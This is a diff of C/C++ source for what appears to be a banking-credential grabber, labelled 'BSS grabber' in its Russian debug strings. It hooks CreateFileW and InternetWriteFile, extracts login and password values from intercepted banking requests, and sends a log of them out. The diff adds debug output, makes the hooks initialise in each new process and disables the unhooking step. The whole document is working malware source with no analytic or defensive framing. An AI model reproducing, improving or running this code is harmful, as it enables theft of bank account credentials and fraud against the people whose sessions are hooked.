@@ -7,6 +7,18 @@
 
 //bss
 
+#include "BotDebug.h"
+
+namespace BSSBGTEMPLATES
+{
+	#include "DbgTemplates.h"
+}
+
+// Объявляем шаблон вывода отладочных строк
+#define BSSDBG BSSBGTEMPLATES::DBGOutMessage<>
+
+
+
 typedef struct
 {
 	HCAB hCab; 
@@ -189,8 +201,9 @@ HANDLE WINAPI HOOK_BSSCreateFileW( LPCWSTR lpFileName, DWORD dwDesiredAccess, DW
 
 void HookBSSCreateFileW()
 {
-	if (BSSHooksInitialized)
+	if (!BSSHooksInitialized)
 	{
+		BSSDBG("BSS", "Инициализируем хуки создания файлов");
 		if ( HookApi( 1, 0x8F8F102, &HOOK_BSSCreateFileW ) )
 		{
 			__asm mov [REAL_BSSCreateFileW], eax
@@ -224,6 +237,8 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 					PCHAR Password	= GetTextBetween(Tmp,  "<P>", "</P>" );
 					if ( Login != NULL && Password != NULL)
 					{
+						BSSDBG("BSS", "Перехвачен запрос");
+
 						HINTERNET hParent;
 						DWORD dwSize = sizeof( HINTERNET );
 
@@ -347,10 +362,10 @@ void GetBSSInfo( HINTERNET hFile, LPCVOID lpBuffer, DWORD dwNumberOfBytesToWrite
 		}
 	}
 
-	if ( BSSLog != NULL && BSSLog->dwEntry )
+	if ( BSSLog != NULL  && BSSLog->dwEntry )
 	{
-		UnhookCreateFileW();
-
+		//UnhookCreateFileW();
+        BSSDBG("BSS", "Отправляем лог BSS грабера");
 		if ( !BSSLog->bFloppy )
 		{
 			pSetErrorMode( SEM_FAILCRITICALERRORS ); 
@@ -371,13 +386,13 @@ BOOL WINAPI HOOK_BSSInternetWriteFile( HINTERNET hFile, LPCVOID lpBuffer, DWORD 
 	return REAL_BSSInternetWriteFile( hFile, lpBuffer, dwNumberOfBytesToWrite, lpdwNumberOfBytesWritten );
 }
 
-bool bBSSHooked = false;
+DWORD BSSPID = 0;
 
 
 void BSSHooks()
 {
 
-	if ( !bBSSHooked )
+	if (IsNewProcess(BSSPID))
 	{
 
     	InitScreenLib();
@@ -388,8 +403,6 @@ void BSSHooks()
 			__asm mov [REAL_BSSInternetWriteFile], eax
 		}
 
-		bBSSHooked = true;
+		BSSDBG("BSS", "BSS грабер инициализирован");
 	}
-	
-	return;
 }
